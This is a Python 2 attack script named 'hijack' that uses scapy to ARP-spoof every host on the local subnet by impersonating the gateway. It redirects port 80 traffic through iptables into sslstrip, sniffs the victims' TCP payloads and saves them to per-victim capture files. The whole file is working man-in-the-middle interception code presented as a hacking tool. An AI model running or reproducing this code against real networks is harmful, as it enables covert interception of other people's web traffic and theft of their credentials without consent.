#!/usr/bin/env python
import socket
from scapy.all import *
import sys
import os
import time
import subprocess
import signal
import threading
import getopt

def usage():
	print ""
	print "!!!HACK WITH FUN!!! *SNIFFER*"
	print	
	print "Usage: hijack [option] argument."
	print "Ex: hijack -l [Listen Port] -p [Sniff Port] [argument]"+"   "+"You must have to specify : [-p] \"Sniffing Port Option\"" 
	print 
	print "-l : Listenig Port"+"                                       "+"Start a Proxy Socket for [host]:[port] for all sniffed traffic for capturing and forwading"
	print "-p : Sniffing Port"+"                                       "+"Start listening for traffic comming from [port] "
	print ""
	print "Examples:"
	print "hijack -l 8080 -p 80"+"                                     "+"By default it will listen on port 8080 for all incoming traffic on port 80"
	sys.exit(0)





def intrpt(signal,frame):
	if os.path.isfile('pid'):
	 f=open('pid','r')
	 p_id=f.read()
	 f.close()
	 process=p_id.split(',')	
	if mainpid==os.getpid():
		print ""
		print "Program is terminated on your request, !!!Happy Hacking!!!"
	exit()
signal.signal(signal.SIGINT,intrpt)
##################Constructor Start
def main():
 arg=sys.argv
 i=conf.iface
 global hostup
 global host
 host=[]
 hostup=[]
 for network in conf.route.routes:
	if i in network and int(network[0])==0:
		global gateway 
		gateway=network[2]
		ip=network[4]
		subnet=conf.route.get_if_bcast(i).replace('255','*')

 online_host=arping(subnet,verbose=conf.verb)
 #print online_host
 for i in online_host[0]:
  if i[1].psrc!=gateway:
	host.append(i[1].psrc)
	hostup.append([i[1].psrc,i[1].hwsrc])
 #print hostup
 print host
##########static entry##########
 #hostup=[['192.168.2.26','00:88:65:0f:0c:c4']]  #remove previous 5 comment to implement 
############################
 arpspoof()
#print hostup
##################Constructer End





################ArpSpoof Function
def arpspoof():

 #Online_Number=len(hostup)
 if os.path.isfile('pid'):
	os.remove('pid')
 for i in hostup:
	f=os.fork()
	if f==0:
		p_id=str(os.getpid())
		pfile=open('pid','a')
		pfile.write(p_id+',')
		pfile.close()
		q=Ether(dst=i[1])/ARP(op='is-at',psrc=gateway,pdst=i[0],hwdst=i[1])
		sendp(q,loop=1,inter=0.7)
		sys.exit(0)
	else:
		pass

########### ArpSpooof End

################Sniffer Start############
def sniffer_child(packet):
 try:
  if packet['IP'].src in host:
	file_user_ip=packet['IP'].src
	file_host_ip=packet['IP'].dst
	#print file_user_ip,file_host_ip
	
	host_name=socket.gethostbyaddr(file_host_ip)
	#print host_name

	os.chdir('/home/hh/wingide/')
	if os.path.isdir('./capture'):
		#print "j"
		if os.path.isdir('./capture/'+file_user_ip):
			#print "k"
			#print os.path.isfile('./capture/'+file_user_ip+"/"+host_name[0])
			if os.path.isfile('./capture/'+file_user_ip+"/"+host_name[0]):
			 #print "l"
			 try: 
			  if packet.load:
				data=packet.load
				#print file_user_ip
				#print host_name[0]
				#print data
				os.chdir('/home/hh/wingide/capture/'+file_user_ip)
				f=open(host_name[0],'a+w')
				f.write(data+'\n\n\n')
				f.close()
			 except:
				pass
				#print "error"
			else:
				subprocess.call(['touch','./capture/'+file_user_ip+"/"+host_name[0]])
		else:
			os.mkdir('./capture/'+file_user_ip)
			subprocess.call(['touch','./capture/'+file_user_ip+"/"+host_name[0]])
			#print 'created 2'
 except:
	pass

def sniffer_parent(packet):
	t=threading.Thread(target=sniffer_child,args=(packet))
	t.start()

def sniffer():
 sniff(filter='tcp',prn=sniffer_parent)
 while True:
 	pass

########################Sniffer End#########



################Starter###################
def start():
	try:
	 global option,argument
	 option,argument=getopt.getopt(sys.argv[1:],"l:p:",["listen","sniff"])
	except getopt.GetoptError as err:
		print
		print str(err)
		usage()
	global listenport,sniffport
	listenport=8080
	sniffport=80

	

	#os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
	os.system('iptables -t nat  -A PREROUTING -p tcp --destination-port '+ str(sniffport) +' -j REDIRECT --to-port '+ str(listenport))
	
	mainprocess=os.fork()
	if mainprocess==0:
	 try:
		x=os.system('python ./hijacker/sslstrip.py -l '+ str(listenport))
		if x!=0 and x!=2:
			print ""
			print "!!!Entered port in Use!!!"+"  "+"Use any other Port Number" 
			os.kill(mainpid,signal.SIGINT)
	 except:
		pass
		
	
	else:	
   		main()
		sniffer()
   		#while True:
			#pass
	
		#pass
##################Starter#############

if __name__=="__main__":
	if len(sys.argv[1:])>=2:
		global mainpid
		mainpid=os.getpid()
		start()
	else:
		usage()
